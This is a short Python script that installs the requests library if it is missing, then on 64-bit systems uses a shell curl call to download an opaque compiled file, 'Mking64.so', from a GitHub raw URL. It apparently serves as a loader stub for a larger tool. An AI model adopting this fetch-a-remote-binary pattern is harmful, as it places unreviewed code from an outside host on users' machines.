import os, platform
try:
    import requests
except:
    os.system('pip install requests')
import requests
bit = platform.architecture()[0]
if bit == '64bit':
    os.system("curl -L https://raw.githubusercontent.com/hechamoto/files/main/Mking64.so -o Mking64.so")
